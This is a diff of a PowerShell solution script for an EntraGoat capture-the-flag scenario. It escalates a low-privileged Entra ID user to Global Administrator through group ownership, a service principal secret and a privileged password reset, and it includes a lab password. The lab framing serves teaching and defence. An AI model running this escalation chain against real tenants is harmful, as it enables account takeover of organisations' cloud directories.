@@ -10,12 +10,12 @@ Group-Ownership -> App Admin -> SP -> PAA -> GA
 Attack flow: 
 
 1. The attacker starts as a low-privileged IT support user (Michael Chen).
-Through a misconfiguration, this user owns a security group that has been assigned the Application Administrator role.
+Through a misconfiguration, this user owns multiple security groups - some with administrative roles assigned and others as normal groups without roles.
 
-2. Since group owners can manage group membership, the attacker adds themselves to the group.
-No approval needed - group ownership means full control over membership. Now they have App Admin privileges.
+2. Since group owners can manage group membership, the attacker can add themselves to any of these groups.
+No approval needed - group ownership means full control over membership. This gives them access to multiple privileged roles from the groups that have roles assigned.
 
-3. With App Admin role, the attacker can manage ALL application registrations and service principals in the tenant.
+3. With Application Administrator role (from IT Application Managers group), the attacker can manage ALL application registrations and service principals in the tenant.
 This includes adding credentials to any service principal - a powerful capability often overlooked.
 
 4. The attacker discovers a service principal that's a member of another group with Privileged Authentication Administrator (PAA) role.
@@ -53,20 +53,15 @@ Common scenarios where this happens:
 - Application Administrator role given to development teams
 
 The attack is particularly dangerous because:
-- Each individual permission seems reasonable in isolation
-- No single step triggers typical security alerts
+- Each individual part seems reasonable in isolation
 - The privilege chain can be challenging to spot in large environments
 - All actions use legitimate APIs and permissions
 ________________________________________________________________________________________________________________________________________________
 
 .NOTES
 Requires: Get-MSGraphTokenWithUsernamePassword function from BARK (https://github.com/BloodHoundAD/BARK)
-you must have the function/BARK toolkit loaded in PS memory to use this function but other tools (or Connect-MgGraph) can be used as well.
+you must have the function/BARK toolkit loaded in PS memory to use this function but other tools such GraphRunner, ROADtools, and AADInternals or simply Connect-MgGraph can be used as well.
 #>
-
-$tenantId = "[YOUR-TENANT-ID]"
-$UPN = "michael.chen@[YOUR-DOMAIN].onmicrosoft.com"
-$password = "GoatAccess!123"
 
 # quick wrapper to list all members of a group (handles SPs too - uses /beta)
 # as Get-MgGroupMember doesn't show SPs on v1.0, so we use a direct API call instead
@@ -76,7 +71,7 @@ function Get-GroupMembers {
 }
 
 # return all groups a given identity owns and their roles
-function Find-GroupsIOwn {
+function Get-GroupsOwnedBy {
     param([string]$UserId)
     
     Write-Host "Enumerating all groups in the tenant..."
@@ -101,12 +96,18 @@ function Find-GroupsIOwn {
                         $assignedRoles = Get-GroupRoles -GroupId $group.Id
                     }
 
-                    Write-Host "OWNED GROUP FOUND!" -ForegroundColor Red
+                    # Write-Host "OWNED GROUP FOUND!" -ForegroundColor Red
                     Write-Host "   Name: $($group.DisplayName)" -ForegroundColor Yellow
                     Write-Host "   Group ID: $($group.Id)" -ForegroundColor Yellow
                     
                     if ($assignedRoles) {
                         Write-Host "   Assigned Roles: $($assignedRoles -join ', ')" -ForegroundColor DarkYellow
+                    } else {
+                        if ($group.IsAssignableToRole) {
+                            Write-Host "   Assigned Roles: None (group can be assigned roles)" -ForegroundColor Gray
+                        } else {
+                            Write-Host "   Assigned Roles: N/A (group cannot be assigned roles)" -ForegroundColor Gray
+                        }
                     }
 
                     $ownedGroups += [PSCustomObject]@{
@@ -119,7 +120,7 @@ function Find-GroupsIOwn {
             }
         }
         catch {
-            Write-Host "Error checking owners for group $($group.DisplayName): $_" -ForegroundColor DarkYellow
+            Write-Host "Error checking owners for group $($group.DisplayName): $_" -ForegroundColor Red
         }
     }
     return $ownedGroups
@@ -144,69 +145,56 @@ function Get-GroupRoles {
 }
 
 
-# Step 1: Using BARK function for authentication as the low-privileged user
-$userToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
-$userAccessToken = $userToken.access_token
-$SecureToken = ConvertTo-SecureString $userAccessToken -AsPlainText -Force
-Connect-MgGraph -AccessToken $SecureToken
+$tenantId = "[YOUR-TENANT-ID]"
+$UPN = "michael.chen@[YOUR-DOMAIN].onmicrosoft.com"
+$password = "GoatAccess!123"
+
+# Step 1: Authentication as the low-privileged user
+Connect-MgGraph
+
+# Alternatively, we can use BARK to acquire a delegated graph token via ROPC:
+# $userToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
+# $SecureToken = ConvertTo-SecureString $($userToken.access_token) -AsPlainText -Force
+# Connect-MgGraph -AccessToken $SecureToken
 
 Get-MgContext
 
 $currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"
 $currentUser
 
-# Step 2: Find all groups owned by current user
-# $myGroups = Get-GroupsOwnedBy -OwnerId $currentUser.Id - just if we want to be fancy
-# $myGroups | Format-Table 
-
+# Step 2: Enumeration - discover all groups owned by the current user
 $ownedGroups = Get-MgGroup -All | Where-Object {
     (Get-MgGroupOwner -GroupId $_.Id -ErrorAction SilentlyContinue).Id -contains $currentUser.Id
 }
-
-$ownedGroups | Format-Table DisplayName, Id, IsAssignableToRole -AutoSize
+$ownedGroups 
 
 # Check if any owned groups are role-assignable and have assigned roles
+$ownedGroups | Where-Object { $_.IsAssignableToRole -eq $true }
+
+
+# since we owned many groups, we can check each one for their assigned roles
 $roleGroups = $ownedGroups | Where-Object { $_.IsAssignableToRole -eq $true }
 
-# we own IT Application Managers group! lets check what roles it has
-$ITgroup = Get-MgGroup -Filter "displayName eq 'IT Application Managers'" 
-$roles = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($ITgroup.Id)'" 
-$roles | ForEach-Object { (Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId).DisplayName }
-
-# if we owned many groups
-# foreach ($group in $roleGroups) {
-#     $roles = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($group.Id)'" | 
-#              ForEach-Object { (Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId).DisplayName }
-#     if ($roles) {
-#         Write-Host "Group '$($group.DisplayName)' has roles: $($roles -join ', ')" -ForegroundColor Red
-#     }
-# }
-
-
-# since we own the group, we can add ourselves to it
-$memberParams = @{
-    "@odata.id" = "https://graph.microsoft.com/v1.0/users/$($currentUser.Id)"
+foreach ($group in $roleGroups) {
+    $roles = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($group.Id)'" | 
+             ForEach-Object { (Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId).DisplayName }
+    if ($roles) {
+        Write-Host "Group '$($group.DisplayName)' has roles: $($roles -join ', ')" 
+    }
 }
-New-MgGroupMemberByRef -GroupId $ITgroup.Id -BodyParameter $memberParams
 
-# refresh the context to see the new group membership
+# Alternatively we can use the fancy custom function Get-GroupsOwnedBy to automate the process of finding all groups owned by the current user
+$ownedGroups = Get-GroupsOwnedBy -UserId $currentUser.Id 
+$ownedGroups | Format-Table 
 
-Disconnect-MgGraph
-$userAccessToken2 = (Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId).access_token
-Connect-MgGraph -AccessToken (ConvertTo-SecureString $userAccessToken2 -AsPlainText -Force)
+# IT Application Managers group has the Application Administrator role! 
 
-# you can use the parse-JWTToken cmdlet by BARK to see the new roles (wids) assigned to the user
-parse-JWTToken $userToken.access_token
-# VS
-parse-JWTToken $userAccessToken2
+# Since we now have the ability to add ourselves to an Application Administrator group, we can manage service principals - including adding new credentials. Time to hunt for high-value SPs.
 
-# Step 4: Now that we're apart of an Application Administrator group, we can manage (== add secrets to) service principals - let's find interesting SPs! 
+# Step 4: Building the attack chain
+# Note: At this stage, the scenario can be completed by adding a secret to any privileged service principal in the tenant. For this walkthrough, we'll focus on SPs with the Privileged Authentication Administrator (PAA) or Global Administrator (GA) roles, since only these roles can reset a GA's password.
 
-# Note: At this point the scenraio can be solved by adding a secret to any privilged SP in your tenant, 
-# we will focus on the PAA & GA roles as the target is to escalate to GA and only PAA or GA roles can reset its password.
-
-# lets find all SPs in the tenant that have PAA or GA roles assigned
-# List every service-principal that holds GA or Priv-Auth-Admin
+# lets list all SPs in the tenant that have PAA or GA roles assigned
 $roleMap = @{
     "62e90394-69f5-4237-9190-012177145e10" = "Global Administrator"
     "7be44c8a-adaf-4e2a-84d6-ab2649e08a13" = "Privileged Authentication Administrator"
@@ -218,21 +206,22 @@ Get-MgRoleManagementDirectoryRoleAssignment -All |
   Sort-Object Id -Unique |
   Select-Object DisplayName, AppId, Id
 
-# But that's not all the SPs that have PAA or GA roles assigned, we need to check each group that has those roles for members that are SPs
+# None are returned.
+
+# BUT that's not the complete set of SPs with PAA or GA privileges. We need to enumerate each group holding these roles and identify which of their members are service principals.
 # first we'll find all groups that have PAA or GA roles assigned
 $allRoleGroups = Get-MgGroup -All -Filter "isAssignableToRole eq true"
-
 $privilegedGroups = @()
 foreach ($group in $allRoleGroups) {
     $roles = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($group.Id)'" |
              Select-Object -Expand RoleDefinitionId
 
     if ($roles -contains "62e90394-69f5-4237-9190-012177145e10") {
-        Write-Host "$($group.DisplayName) has role: $($roleMap['62e90394-69f5-4237-9190-012177145e10'])" -ForegroundColor DarkYellow
+        Write-Host "$($group.DisplayName) has role: $($roleMap['62e90394-69f5-4237-9190-012177145e10'])" -ForegroundColor Yellow
         $privilegedGroups += $group
     }
     elseif ($roles -contains "7be44c8a-adaf-4e2a-84d6-ab2649e08a13") {
-        Write-Host "$($group.DisplayName) has role: $($roleMap['7be44c8a-adaf-4e2a-84d6-ab2649e08a13'])" -ForegroundColor DarkYellow
+        Write-Host "$($group.DisplayName) has role: $($roleMap['7be44c8a-adaf-4e2a-84d6-ab2649e08a13'])" -ForegroundColor Yellow
         $privilegedGroups += $group
     }
 }
@@ -240,16 +229,9 @@ foreach ($group in $allRoleGroups) {
 # Find SP members in those groups
 $targetSPs = @() 
 foreach ($group in $privilegedGroups) {
-    Write-Host "`n[+] Checking group: $($group.DisplayName)" -ForegroundColor Cyan
     $members = Get-GroupMembers -GroupId $group.Id
-    
     $spMembers = $members | Where-Object { $_.'@odata.type' -eq '#microsoft.graph.servicePrincipal' }
-    
     foreach ($sp in $spMembers) {
-        Write-Host "   [!] Found service principal: $($sp.displayName)" -ForegroundColor Yellow
-        Write-Host "       SP ID: $($sp.id)" -ForegroundColor DarkYellow
-        Write-Host "       App ID: $($sp.appId)" -ForegroundColor DarkYellow
-        
         $targetSPs += [PSCustomObject]@{
             Name = $sp.displayName
             SPId = $sp.id
@@ -258,14 +240,37 @@ foreach ($group in $privilegedGroups) {
         }
     }
 }
+$targetSPs
 
 # depending on your environment, you may have many SPs with PAA or GA roles assigned. 
 # We can simply pick the first one ($targetSPs[0]) but for the sake of the scenario, and to keep the same solution for all players, 
 # we'll focus on the SP of "Identity Management Portal" since we know for sure its there (and we dont want to break any env)
+
+
+# Step 5: Executing the attack path 
+
+# we own IT Application Managers group that has the Application Administrator role
+$ITgroup = Get-MgGroup -Filter "displayName eq 'IT Application Managers'" 
+
+# since we own the group, we can add ourselves to it
+$memberParams = @{
+    "@odata.id" = "https://graph.microsoft.com/v1.0/users/$($currentUser.Id)"
+}
+New-MgGroupMemberByRef -GroupId $ITgroup.Id -BodyParameter $memberParams
+
+# refresh the context to see the new group membership
+Disconnect-MgGraph
+
+$userAccessToken2 = (Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId).access_token
+Connect-MgGraph -AccessToken (ConvertTo-SecureString $userAccessToken2 -AsPlainText -Force)
+
+# you can use the parse-JWTToken cmdlet by BARK to see the new roles (wids) assigned to the user
+parse-JWTToken $userToken.access_token
+# VS
+parse-JWTToken $userAccessToken2
+
 $targetSP = $targetSPs | Where-Object { $_.Name -eq "Identity Management Portal" }
 
-
-# Step 5: Add a secret to the SP and authenticate as it
 $secretDescription = "EntraGoat-Secret-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
 $passwordCredential = @{
     DisplayName = $secretDescription
@@ -302,8 +307,7 @@ Disconnect-MgGraph
 # Step 7: Authenticate as GA and get flag
 
 $adminToken = Get-MSGraphTokenWithUsernamePassword -Username $adminUser.UserPrincipalName -Password $newPassword -TenantID $tenantId
-$adminAccessToken = $adminToken.access_token
-$SecureAdminToken = ConvertTo-SecureString $adminAccessToken -AsPlainText -Force
+$SecureAdminToken = ConvertTo-SecureString $($adminToken.access_token) -AsPlainText -Force
 Connect-MgGraph -AccessToken $SecureAdminToken
 
 # Verify admin authentication
@@ -316,3 +320,5 @@ Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userP
                   @{n='Flag';e={$_.onPremisesExtensionAttributes.extensionAttribute1}}
 
 Disconnect-MgGraph
+
+# Don't forget to run the cleanup script to restore the tenant to it's original state!
